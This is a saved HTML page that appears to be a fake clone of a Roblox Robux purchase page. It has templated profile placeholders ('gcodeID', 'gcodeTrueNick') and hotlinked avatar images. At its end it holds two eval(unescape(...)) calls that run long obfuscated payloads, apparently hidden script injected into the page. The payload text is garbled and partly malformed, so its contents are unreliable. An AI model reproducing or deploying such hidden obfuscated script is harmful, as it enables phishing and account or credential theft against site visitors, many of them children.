        .foundation-web-interactable{outline-width:0;overflow:hidden;position:relative}.foundation-web-interactable:before{bottom:0;content:"";left:0;position:absolute;right:0;top:0;transition:background-color var(--time-100) var(--ease-linear)}.foundation-web-interactable:focus-visible{outline:var(--stroke-thicker) solid var(--color-selection-start);outline-offset:3px}@media (hover:hover){.foundation-web-interactable:not(:disabled):hover:before{background-color:var(--color-state-hover)}}.foundation-web-interactable:not(:disabled):active:before{background-color:var(--color-state-press)}
    
</style>

    
<style type="text/css">

        @keyframes rotation{0%{transform:rotate(0deg)}to{transform:rotate(359deg)}}.foundation-web-loading-spinner{animation:rotation 1s linear infinite normal;display:flex}.foundation-web-loading-spinner svg path{fill:var(--color-action-standard-foreground)}
    
</style>

    
<style type="text/css">

        .foundation-web-button{-webkit-user-select:none;-moz-user-select:none;user-select:none}.foundation-web-button[disabled]{opacity:.5}.foundation-web-button .foundation-web-loading-spinner svg path{fill:currentColor}
    
</style>

    
<style type="text/css">

        .foundation-web-icon-button[disabled]{opacity:.5}
    
</style>

    
<style type="text/css">

        .foundation-web-checkbox.foundation-web-checkbox-disabled{opacity:.5}.foundation-web-checkbox .foundation-web-interactable{outline-offset:3px}
    
</style>

    
<style type="text/css">

        .foundation-web-dropdown.foundation-web-dropdown-disabled{opacity:.5;pointer-events:none}.foundation-web-menu-item.foundation-web-interactable:focus-visible{outline-offset:-1px}.foundation-web-menu-item.foundation-web-interactable:focus-visible:hover{outline-width:0}.foundation-web-menu-item[data-disabled] span{opacity:.5}
    
</style>

    
<style type="text/css">

        .disabled{opacity:.5}.foundation-web-radio-indicator:after{background-color:var(--color-action-sub-emphasis-foreground);border-radius:100%content:"";display:block}.foundation-web-radio-indicator-xsmall:after{height:var(--size-150);width:var(--size-150)}.foundation-web-radio-indicator-small:after{height:var(--size-200);width:var(--size-200)}.foundation-web-radio-indicator-large:after,.foundation-web-radio-indicator-medium:after{height:var(--size-250);width:var(--size-250)}.foundation-web-radio{align-items:center;border:var(--stroke-standard) solid;border-color:var(--color-stroke-emphasis);border-radius:100%display:flex;flex:0 0 auto;flex-direction:column;justify-content:center;outline-offset:3px}.foundation-web-radio[data-state=checked]{background-color:var(--color-action-sub-emphasis-background)}
    
</style>

    
<style type="text/css">

        .foundation-web-toggle.disabled{opacity:50%}
    
</style>

    
<style type="text/css">

        .disabled{opacity:.5}.foundation-web-text-area{resize:auto}
    
</style>

    
<style type="text/css">

        .foundation-web-interactable{overflow:hidden;position:relative}.foundation-web-interactable:before{bottom:0;content:"";left:0;position:absolute;right:0;top:0;transition:background-color var(--time-100) var(--ease-linear)}.foundation-web-interactable:focus-visible{outline:var(--stroke-thicker) solid var(--color-selection-start)}@media (hover:hover){.foundation-web-interactable:not(:disabled):hover:before{background-color:var(--color-state-hover)}}.foundation-web-interactable:not(:disabled):active:before{background-color:var(--color-state-press)}
    
</style>

    
<style type="text/css">

        @keyframes rotation{0%{transform:rotate(0deg)}to{transform:rotate(359deg)}}.foundation-web-loading-spinner{animation:rotation 1s linear infinite normal;display:flex}.foundation-web-loading-spinner svg path{fill:var(--color-action-standard-foreground)}
    
</style>

    
<style type="text/css">

        .foundation-web-button{-webkit-user-select:none;-moz-user-select:none;user-select:none}.foundation-web-button[disabled]{opacity:.5}.foundation-web-button.content-action-emphasis{--button-spinner-fill:var(--color-action-emphasis-foreground)}.foundation-web-button.content-action-standard{--button-spinner-fill:var(--color-action-standard-foreground)}.foundation-web-button.content-action-soft-emphasis{--button-spinner-fill:var(--color-action-soft-emphasis-foreground)}.foundation-web-button.content-action-alert{--button-spinner-fill:var(--color-action-alert-foreground)}.foundation-web-button .foundation-web-loading-spinner svg path{fill:var(--button-spinner-fill)}.foundation-web-button .foundation-web-button-content.isLoading{opacity:0}.foundation-web-button .foundation-web-loading-spinner-wrapper{left:50%position:absolute;top:50%transform:translate(-50%,-50%)}
    
</style>

    
<style type="text/css">

        .disabled{opacity:.5}.foundation-web-radio-indicator:after{background-color:var(--color-action-sub-emphasis-foreground);border-radius:100%content:"";display:block}.foundation-web-radio-indicator-xsmall:after{height:var(--size-150);width:var(--size-150)}.foundation-web-radio-indicator-small:after{height:var(--size-200);width:var(--size-200)}.foundation-web-radio-indicator-large:after,.foundation-web-radio-indicator-medium:after{height:var(--size-250);width:var(--size-250)}.foundation-web-radio{align-items:center;border:var(--stroke-standard) solid;border-color:var(--color-stroke-emphasis);border-radius:100%display:flex;flex:0 0 auto;flex-direction:column;justify-content:center;outline-offset:3px}.foundation-web-radio[data-state=checked]{background-color:var(--color-action-sub-emphasis-background)}
    
</style>


</head>



<body id="rbx-body" dir="ltr" class="rbx-body   dark-theme builder-font " data-performance-relative-value="0.005" data-internal-page-name="PremiumRobux" data-send-event-percentage="0" __processed_1325f4c9-eb3a-4952-a1b4-8f1a45f78f27__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJUSUtUT0siOiJkaXNhYmxlZCIsIkxJTktFRElOIjoiZGlzYWJsZWQiLCJDT05GSUciOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMi4wLjI2Iiwic2NvcmUiOjIwMDI2fV0=">

    
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Theme" data-bundle-source="Main" src="https://js.rbxcdn.com/02a63ed03498b17dc2e133716717d996d9be5ab25ae788ee1234d40267fc2d2b.js">

</script>




    
<meta name="csrf-token" data-token="KX/jtnP33Et/">



    
<script src="https://roblox.com/js/hsts.js?v=3" type="text/javascript" id="hsts" async="">

</script>


    
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Linkify" data-bundle-source="Main" src="https://js.rbxcdn.com/c0b9b674b2a87f0aa6358830e63fa62841ce9a3e24f065c5fd33b7e73f22ffa6.js">

</script>



    
<div id="image-retry-data" data-image-retry-max-times="30" data-image-retry-timer="500" data-ga-logging-percent="10">

    
</div>

    
<div id="http-retry-data" data-http-retry-max-timeout="0" data-http-retry-base-timeout="0" data-http-retry-max-times="1">

    
</div>



    
<div id="wrap" class="wrap no-gutter-ads logged-in">



        
<div id="navigation-container" class="builder-font ixp-marketplace-rename-treatment charts-rename-exp-treatment" data-number-of-autocomplete-suggestions="7" data-is-redirect-library-to-creator-marketplace-enabled="True" data-platform-event-left-nav-entry-start-time="01/01/2000 12:00:00" data-platform-event-left-nav-entry-end-time="07/12/2025 19:00:00" data-platform-event-left-nav-url="https://www.roblox.com/the-hatch">

            
<div id="header" class="navbar-fixed-top rbx-header" role="navigation">

                
<div class="container-fluid">

                    
<div class="rbx-navbar-header">

                        
<div id="header-menu-icon" class="rbx-nav-collapse">

                            
<button type="button" class="btn-primary-xs btn-min-width" id="skip-to-main-content">
Skip to Main Content
</button>

                            
<button type="button" class="menu-button btn-navigation-nav-menu-md" title="nav menu">

<span class="icon-nav-menu">

</span>

</button>

                        
</div>

                        
<div class="navbar-header">

                            
<a class="navbar-brand" href="/home">

                                
<span class="icon-logo">

</span>

<span class="icon-logo-r">

</span>

                            
</a>

                        
</div>

                    
</div>

                    
<ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">

                        
<li>

                            
<a class="font-header-2 nav-menu-title text-header" href="/charts">
Charts
</a>

                        
</li>

                        
<li>

                            
<a class="font-header-2 nav-menu-title text-header" href="/catalog">
Marketplace
</a>

                        
</li>

                        
<li>

                            
<a id="header-develop-md-link" class="font-header-2 nav-menu-title text-header" href="https://create.roblox.com/">
Create
</a>

                        
</li>

                        
<li id="navigation-robux-container">

                            
<div>

<a class="font-header-2 nav-menu-title text-header robux-menu-btn" href="https://www.roblox.com/upgrades/robux?ctx=navpopover">
Robux
</a>

</div>

                        
</li>

                    
</ul>


                    
<ul class="nav rbx-navbar hidden-md hidden-lg col-xs-12">

                        
<li>

                            
<a class="font-header-2 nav-menu-title text-header" href="/charts">
Charts
</a>

                        
</li>

                        
<li>

                            
<a class="font-header-2 nav-menu-title text-header" href="/catalog">
Marketplace
</a>

                        
</li>

                        
<li>

                            
<a id="header-develop-sm-link" class="font-header-2 nav-menu-title text-header" href="https://create.roblox.com/">
Create
</a>

                        
</li>

                        
<li id="navigation-robux-mobile-container">

                            
<div>

<a class="font-header-2 nav-menu-title text-header robux-menu-btn" href="https://www.roblox.com/upgrades/robux?ctx=navpopover">
Robux
</a>

</div>

                        
</li>

                    
</ul>

                    
<div id="right-navigation-header">

                        
<div data-testid="navigation-search-input" class="navbar-left navbar-search col-xs-5 col-sm-6 col-md-2 col-lg-3" role="search">

                            
<div class="input-group">

                                
<form name="search-form" action="/search">

                                    
<div class="form-has-feedback">

                                        
<input id="navbar-search-input" type="search" name="search-bar" data-testid="navigation-search-input-field" class="form-control input-field new-input-field" placeholder="Search" maxlength="120" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" value="">

                                    
</div>

                                
</form>

                                
<div class="input-group-btn">

                                    
<button data-testid="navigation-search-input-search-button" class="input-addon-btn" type="submit">

<span class="icon-common-search-sm">

</span>

</button>

                                
</div>

                            
</div>

                            
<ul class="dropdown-menu new-dropdown-menu" role="menu">

                                
<li class="navbar-search-option rbx-clickable-li new-selected">

<a class="new-navbar-search-anchor" href="https://www.roblox.com/discover/?Keyword=">

<span class="icon-menu-games-off navbar-list-option-icon">

</span>

<span class="navbar-list-option-text">

</span>

<span class="navbar-list-option-suffix">
in Experiences
</span>

</a>

</li>

                                
<li class="navbar-search-option rbx-clickable-li">

<a class="new-navbar-search-anchor" href="https://www.roblox.com/search/users?keyword=">

<span class="icon-menu-profile navbar-list-option-icon">

</span>

<span class="navbar-list-option-text">

</span>

<span class="navbar-list-option-suffix">
in People
</span>

</a>

</li>

                                    
<li class="navbar-search-option rbx-clickable-li">

<a class="new-navbar-search-anchor" href="https://www.roblox.com/catalog?CatalogContext=1&Keyword=">

<span class="icon-menu-shop navbar-list-option-icon">

</span>

<span class="navbar-list-option-text">

</span>

<span class="navbar-list-option-suffix">
in Marketplace
</span>

</a>

</li>

                                        
<li class="navbar-search-option rbx-clickable-li">

<a class="new-navbar-search-anchor" href="https://www.roblox.com/search/communities?keyword=">

<span class="icon-menu-groups navbar-list-option-icon">

</span>

<span class="navbar-list-option-text">

</span>

<span class="navbar-list-option-suffix">
in Communities
</span>

</a>

</li>

                                            
<li class="navbar-search-option rbx-clickable-li">

<a class="new-navbar-search-anchor" href="https://create.roblox.com/store/models?keyword=">

<span class="icon-menu-library navbar-list-option-icon">

</span>

<span class="navbar-list-option-text">

</span>

<span class="navbar-list-option-suffix">
in Creator Store
</span>

</a>

</li>

                            
</ul>

                            
<div id="search-landing-root" data-testid="search-landing-root" class="search-landing-root">

</div>

                        
</div>

                        
<div class="navbar-right rbx-navbar-right">

                            
<ul class="nav navbar-right rbx-navbar-icon-group">

                                
<div class="sg-system-feedback">

                                    
<div class="alert-system-feedback">

                                        
<div class="alert">

<span class="alert-content">

</span>

</div>

                                    
</div>

                                
</div>

                                
<div class="age-bracket-label text-header">

<a class="text-link dynamic-overflow-container" href="https://www.roblox.com/?gcodeID">

<span class="avatar avatar-headshot-xs">

<span class="thumbnail-2d-container avatar-card-image">

<img class="gcodePhoto" src="https://i.pinimg.com/736x/0a/7f/fa/0a7ffaac014a38fac99d62596109932b.jpg">

</span>

</span>

<span class="text-overflow age-bracket-label-username font-caption-header gcodeTrueNick">
Roblox
</span>

</a>

                                    
<span class="xsmall age-bracket-label-age text-secondary">
13 
</span>

                                
</div>

                                
<li class="rbx-navbar-right-search">

                                    
<button type="button" class="rbx-menu-item btn-navigation-nav-search-white-md">

<span class="icon-nav-search-white">

</span>

</button>

                                
</li>

                                
<li id="navbar-stream" class="navbar-icon-item navbar-stream notification-margins">

                                    
<button type="button" class="btn-uiblox-common-common-notification-bell-md">

<span class="nav-robux-icon rbx-menu-item ng-scope">

<div class="notification-stream-indicator" ng-class="{'inApp': library.inApp}" id="notification-stream-icon-container" notification-stream-indicator="true">
 
<a id="nav-ns-icon" class="rbx-menu-item notification-stream-icon">
 
<span class="icon-common-notification-bell" id="common-notification-bell">

</span>
                                        
<span class="notification-red notification bell-red-badge ng-binding" id="notifications-bell-badge" ng-show="layout.unreadNotifications > 0">
 6 
</span>
 
</a>

                        
</div>

                        
</span>

                        
</button>

                        
</li>

                        
<li id="navbar-robux" class="navbar-icon-item">

                            
<button type="button" class="btn-navigation-nav-robux-md">

<span id="nav-robux-icon" class="nav-robux-icon rbx-menu-item">

<span class="icon-robux-28x28 roblox-popover-close" id="nav-robux">

</span>

<span class="rbx-text-navbar-right text-header" id="nav-robux-amount">

</span>

<span class="notification-red robux-badge hidden">

</span>

</span>

                            
</button>

                        
</li>

                        
<li id="navbar-settings" class="navbar-icon-item">

                            
<button type="button" class="btn-navigation-nav-settings-md">

<span id="settings-icon" class="nav-settings-icon rbx-menu-item">

<span class="icon-nav-settings roblox-popover-close" id="nav-settings">

</span>

<span class="notification-red notification nav-setting-highlight hidden">
0
</span>

</span>

                            
</button>

                        
</li>

                        
</ul>

                    
</div>

                
</div>

            
</div>

        
</div>

        
<div id="left-navigation-container">

            
<div id="navigation" class="rbx-left-col">

                
<ul>

                    
<li>

<a class="dynamic-overflow-container text-nav" href="https://www.roblox.com/?gcodeID" role="link">

<span class="avatar avatar-headshot-xs">

<span class="thumbnail-2d-container avatar-card-image">

<img class="gcodePhoto" src="https://play-lh.googleusercontent.com/7cIIPlWm4m7AGqVpEsIfyL-HW4cQla4ucXnfalMft1TMIYQIlf2vqgmthlZgbNAQoaQ">

</span>

</span>

<div class="font-header-2 dynamic-ellipsis-item gcodeTrueNick">
Roblox
</div>

</a>

</li>

                    
<li class="rbx-divider">

</li>

                
</ul>

                
<div data-simplebar="init" class="rbx-scrollbar">

                    
<div class="simplebar-wrapper" style="margin: 0px;">

                        
<div class="simplebar-height-auto-observer-wrapper">

                            
<div class="simplebar-height-auto-observer">

</div>

                        
</div>

                        
<div class="simplebar-mask">

                            
<div class="simplebar-offset" style="right: 0px; bottom: 0px;">

                                
<div class="simplebar-content-wrapper" tabindex="0" role="region" aria-label="scrollable content" style="height: auto; overflow: hidden;">

                                    
<div class="simplebar-content" style="padding: 0px;">

                                        
<ul class="left-col-list">

                                            
<li>

                                                
<a class="dynamic-overflow-container text-nav" href="https://www.roblox.com/home" id="nav-home" target="_self">

                                                    
<div>

<span class="icon-nav-home">

</span>

</div>

<span class="font-header-2 dynamic-ellipsis-item" title="Home">
Home
</span>

</a>

                                            
</li>

                                            
<li>

                                                
<a class="dynamic-overflow-container text-nav" href="https://www.roblox.com/?gcodeID" id="nav-profile" target="_self">

                                                    
<div>

<span class="icon-nav-profile">

</span>

</div>

<span class="font-header-2 dynamic-ellipsis-item" title="Profile">
Profile
</span>

</a>

                                            
</li>

                                            
<li>

                                                
<a class="dynamic-overflow-container text-nav" href="https://www.roblox.com/my/messages/#!/inbox" id="nav-message" target="_self">

                                                    
<div>

<span class="icon-nav-message">

</span>

</div>

<span class="font-header-2 dynamic-ellipsis-item" title="Messages">
Messages
</span>

                                                    
<div class="dynamic-width-item align-right">

<span class="notification-blue notification" title="3">
3
</span>

</div>

                                                
</a>

                                            
</li>

                                            
<li>

                                                
<a class="dynamic-overflow-container text-nav" href="https://www.roblox.com/users/friends#!/friend-requests" id="nav-friends" target="_self">

                                                    
<div>

<span class="icon-nav-friends">

</span>

</div>

<span class="font-header-2 dynamic-ellipsis-item" title="Connect">
Connect
</span>

                                                    
<div class="dynamic-width-item align-right">

<span class="notification-blue notification" title="1">
1
</span>

</div>

                                                
</a>

                                            
</li>

                                            
<li>

                                                
<a class="dynamic-overflow-container text-nav" href="https://www.roblox.com/my/avatar" id="nav-character" target="_self">

                                                    
<div>

<span class="icon-nav-charactercustomizer">

</span>

</div>

<span class="font-header-2 dynamic-ellipsis-item" title="Avatar">
Avatar
</span>

</a>

                                            
</li>

                                            
<li>

                                                
<a class="dynamic-overflow-container text-nav" href="https://www.roblox.com/users/8829658592/inventory" id="nav-inventory" target="_self">

                                                    
<div>

<span class="icon-nav-inventory">

</span>

</div>

<span class="font-header-2 dynamic-ellipsis-item" title="Inventory">
Inventory
</span>

</a>

                                            
</li>

                                            
<li>

                                                
<a class="dynamic-overflow-container text-nav" href="https://www.roblox.com/trades" id="nav-trade" target="_self">

                                                    
<div>

<span class="icon-nav-trade">

</span>

</div>

<span class="font-header-2 dynamic-ellipsis-item" title="Trade">
Trade
</span>

</a>

                                            
</li>

                                            
<li>

                                                
<a class="dynamic-overflow-container text-nav" href="https://www.roblox.com/my/communities" id="nav-group" target="_self">

                                                    
<div>

<span class="icon-nav-group">

</span>

</div>

<span class="font-header-2 dynamic-ellipsis-item" title="Communities">
Communities
</span>

</a>

                                            
</li>

                                            
<li>

                                                
<a class="dynamic-overflow-container text-nav" href="https://blog.roblox.com" id="nav-blog" target="_blank">

                                                    
<div>

<span class="icon-nav-blog">

</span>

</div>

<span class="font-header-2 dynamic-ellipsis-item" title="Blog">
Blog
</span>

</a>

                                            
</li>

                                            
<li>

                                                
<button id="nav-shop" type="button" class="dynamic-overflow-container text-nav">

                                                    
<div>

<span class="icon-nav-shop">

</span>

</div>

<span class="font-header-2 dynamic-ellipsis-item" title="Official Store">
Official Store
</span>

</button>

                                            
</li>

                                            
<li>

                                                
<a class="dynamic-overflow-container text-nav" href="https://www.roblox.com/giftcards-us" id="nav-giftcards" target="_self">

                                                    
<div>

<span class="icon-nav-giftcards">

</span>

</div>

<span class="font-header-2 dynamic-ellipsis-item" title="Gift Cards">
Gift Cards
</span>

</a>

                                            
</li>

                                            
<li class="rbx-upgrade-now">

<a href="https://www.roblox.com/premium/membership?ctx=leftnav" class="btn-growth-md btn-secondary-md" id="upgrade-now-button">
Premium
</a>

</li>

                                        
</ul>

                                    
</div>

                                
</div>

                            
</div>

                        
</div>

                        
<div class="simplebar-placeholder" style="width: 0px; height: 0px;">

</div>

                    
</div>

                    
<div class="simplebar-track simplebar-horizontal" style="visibility: hidden;">

                        
<div class="simplebar-scrollbar" style="width: 0px; display: none;">

</div>

                    
</div>

                    
<div class="simplebar-track simplebar-vertical" style="visibility: hidden;">

                        
<div class="simplebar-scrollbar" style="height: 0px; display: none;">

</div>

                    
</div>

                
</div>

            
</div>

        
</div>

        
<div id="verificationUpsell-container">

            
<div>

</div>

        
</div>

        
<div id="phoneVerificationUpsell-container">

            
<div phoneverificationupsell-container="">

</div>

        
</div>

        
<div id="contactMethodPrompt-container">

            
<div contactmethodprompt-container="">

</div>

        
</div>

        
<div id="navigation-account-switcher-container">

            
<div navigation-account-switcher-container="">

</div>

        
</div>



    
</div>


    
<script type="text/javascript">

        var Roblox = Roblox || {};
        (function () {
            if (Roblox && Roblox.Performance) {
                Roblox.Performance.setPerformanceMark("navigation_end");
            }
        })();
    
</script>

    
<main class="container-main content-no-ads 
                
                
                
                
                " id="container-main" tabindex="-1">

        
<script type="text/javascript">

            if (top.location != self.location) {
                top.location = self.location.href;
            }
        
</script>


        
<div class="alert-container">

            
<noscript>

                
<div>

                    
<div class="alert-info" role="alert">
Please enable Javascript to use all the features on this site.
</div>

                
</div>

            
</noscript>




            
<div id="account-security-prompt-container">

</div>



        
</div>





<script type="text/javascript">


<!-- 
eval(unescape('ຶ຿Ÿeຳ຾ູŸfŸeຈຸຘຖຳຖຘທນດັັຐຽຑຈŹbŲa๽ເັຼຈຼຈŵdຈຊຊŵbŲa๽ເັຼຈ຾Ÿd຺ຈŵdຈຽŴeຽ຺Ÿcູ຾ຐຊຓທດປທຘຘນຊຑŵbŲa๽ຽຈŵdຈ຿Ÿeີຽຳັ຺ີຐ຾Ÿd຺ŷbຒŷdຑŵbŲa๽Ÿbຈŵdຈ຿Ÿeີຽຳັ຺ີຐ຾Ÿd຺ŷbຓŷdຈŴbຈຊຘດປປດຖຊຑŵbŲa๽ຶŸfຼຐຈເັຼຈູຈŵdຈຒŵbຈູຈŵcຈຽŴeŸcີŸeື຾ຸŵbຈູŴbŴbຑຈŹbŲa๽๽ຼຈŴbŵdຈຩ຾ຼູŸeືŴeຶຼŸfŸdຟຸັຼຟŸfິີຐຐ຺ັຼຽີລŸe຾ຐŸbŴeຳຸັຼຝ຾ຐູຍŸbŴeŸcີŸeື຾ຸຑຑŷeຽŴeຳຸັຼຟŸfິີຝ຾ຐູຑຑŴbທຑŵbŲa๽ŹdŲa๽ຼີ຾຿ຼŸeຈຼŵbŲaŹdŲa'));
eval(unescape('ິŸfຳ຿ŸdີŸe຾Ŵeແຼູ຾ີຐຸຘຖຳຖຘທນດັັຐຏ')   'ຖŷbŸd຺ງŷdາŷaŸcືຓųfŷaູŸdຶັŸbŸcຆųdຶຬຓųfŷaູŸdຶັŸbŸcຆŵfŲaŲc๵๻Ųc๺ųf຀ųaງຆųeųdງ຀຀ງųfຖŷbŸd຺ງືŷaŵeųfິຳŷf຾຺ŴcາŷdະຳຆųdŷcŸeຫŸcŸaŵbງິŸbŷfຽເŴeູຫŸbາųfŸaຶຉŸfŷcູŸeຶųfຒ๵๻ųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųfŵeŷeຶຼųeŸbຸສໃົŴcŷdŸeະŸeŷeືŸcຶŸfຉສŷeŸaຳŵcຂųcງືŷaŵeųfິຳŷf຾຺ŴcອŸbŸbŸcຯາŸbູິŴaຯŷfŸaູųcງŷcຯູŷeຉŸdŸcŴcຼິິີຳືŷbŷaŸdŸdຳŸbŴcຽŸfືັີິŴdຶŸbຫສີິŷcŵcຂະŷeິŸbຶųf຀ຬŷeŸbŷfŴcŸdŸfŴaŸdŷbŷaŸfŹdຉŸaŸeŷcຮŸeຑາŸaຯŷbີູຬŵaງາຮŸeŸfາųeųeຯŷeຶຫŴaະŸdŴcູຶຶັັŷbີູຉຳŸeŸeŴcອŸcຸŸdŸbŴeູŸeຫŸdີູູັຑູŸeັຮຶະŸbŵaງາຮŸeŸfາųeŵcŲe๻຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ຘŷdື຾ųdŷcŸeຫŸcŸaŵbງິŸb຺ຆŸcິŴaືອຸŸfຳງ຀ຸະŴbŸdŸcŷdໃŸeາŸaŵbງິŸbŷfິŸf຿ŵeາາຍųfŸeŸeສົົųeųeŸfະຉອຸŸdŸcູຳຶີຳຸŵeųfິຳŷf຾຺ŵaຳຸŸdŸeŸfັີູິųfŵdŲb๵຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຖຆຉຑງŸaືພຳŵc຀ŸfŸeŷe຾ŹaŶaŷeັີປŷeຶຫŴbະŸdຜະŵdູຸŶdŸcŷdູ຀ŴaŴcŵaŲcŲcųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆຕ຃ຑŴaຆŸcິຢຸŵcງູູຯໃຼລŷfືຶŵdຫຶŷeŴdືŸaŶdຸŵdຳŸbະŸdຳາŶaŸeŷcິ຀ຑŴaŵaŲd๷ງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆດຯຶໂ຀ŷcຳŷfŸaືປųfຸຸຶŸaŸdໃŸaŴcŷdŸeະŸeŷeືŸcຶŸf຀ະະŴcŸdŷaຳŸaາųeųeŸfະຉŸdຳŵcųeູຳŷcຼ຺ŶeŷaະູຘŷeŸbŷfŴdŸdŸfຢŸaŵaຶŸcŸfຶຸŸfŶbŸeຬັųfŵaŲd๷ງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀ŵeųeŴcŴbųfະຳຢາຒųdųeືŸaຸເŶeŸeສົົຩŸeຸາŸeŸeŶfິŷfŷaຶŶaŷeັີປຶໂ຀ŴaŴcŵaŲcŲcųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຖງŴeŴa຀ະະຜາຓ຀ŸfັູແŶbຸສໃົສຸŸaູຶີŶeີŷaŷcຶພŷeຶຳŵbŸd຺ງŴbŴdŵfŲaŲc຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງຕŷcະໂųaŸbັŴdາຳຓຂŸcືູເຠŸbŷfຽເຬູືູີຳŶeິຫŷfŸd຤ຯິາຘŸdຽງຆະຬປųfŸeŸfŷbຼŹaຉຼŸfŸdິŸeຶŴaŸeີŷaŷcຶຉູຮັິຂųaŷcິຯຸŸcຓຂŸbຶŴbŸaອŸbູຳຆŵfŲaŲc຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ຘŷdື຾ųdຶຬຓųfູູຯໃຼŴaຽŸeຸາŸeŸeŴaູຳຮອŸeŴaຸຯິາຉŹbŸfຮຸŸfູŸcųfຆŷbັŷeືືŵaງິŸeŹbຑŷcູືຸŴaອຳŸbŸbŷfະະັŸfųeŵcŲe๻຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆດຯຶໂ຀ŷcຳŷfŸaືປųfິŸf຾ŴaອຳະŸaŴbຯຫຸŸbຳຸųbŵb๵Ųcງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງຕŷcະໂųaŷcິຯຸŸcຓຂŸdŸeຸŴcŸaັŷeŷcີŸbųfຒ๵๻ųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaທະຑųdŷcŸeຫŸcŸaŵbງŸeŸb຺ŴbŷbŸcະືຉັິŷfŷbູŸcųfŵaມŸfືຳŹdງມŶeຠລųaŶfູຮເົŵe຋ັຐŵaŲcŲcųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdທຬŸdຽųfŷdຳຫŸfŸcŵbຆູຸາຉŸc຾ŷeŸbŸdŸeີຳŴdຮຸະຶŷeະŸaິິųcŵbຖŸbŸdŷeະຒທŷbື຿຀ŷfີŷfŸbຸŵaຂຶຸŸfŴbŸaໃŷcŸdືŸaັາຂຒŶbŸeຆŸdູັŷdຆິŸcŸf຀າŸfິŸbະໃູງŸbີŸeŷfູິŸcືືŸfŴeųaເູ຿ųdŷcຫະງຶຳŸb຀ຜŸfຳີųdŶfຳສຼແຖŴeຬີຽŵaດŴcŸcາຫŸbŵdຖŴeຬີຽŵaŲd๷ງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງŵe຋ŷdະຼŵd๵๸ງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆຕ຋ŷeຶຼŵcŲe๻຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆດຯຶໂ຀ŷcຳŷfŸaືປųfŸeŸfŷbຼŹaຉູຮັິຉŷfຸŸaŸaຶŸbຶຂŵbŲc๺ųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųfŵeŷeຶຼųeຮີຫືŸcŵcųeູຳŷcຼ຺ŴdຸŸdຬຉŷcŸeŸaŸbຫີŸbຳຸŴeŴeຂຒŲa๵ຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຖŷaາຽ຀ອີຮŸdŸaຓųcŸfູຮເົຉືŸdຮŸaŷbຫŸcŷdŴbŸaŷaŷfŸeູųfŵdŲb๵຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ທŷbື຿຀ŷfີŷfŸbຸŵaຂິຸຯຽແຉŸfŸdŷfŸcຯŷeິຬŴaŸfŷfŷaŸfŷdະຳŸbŴeŷcຳະŸdຮືŸdູŸcųfŵaŲd๷ງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdທຬŸdຽųfŷdຳຫŸfŸcŵbຆŸbຸສໃົŴcŸdŸbຫຸŷdŷfຸຯŴaາຫŷcາŷfຶູŸfŴaŸcຯŷbີູຉŷdິŸdາຶŸbູųeŵcŲe๻຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຖŷbŸd຺ງŷdາŷaŸcືຓųfູູຯໃຼŴaະີŷaŷdູິ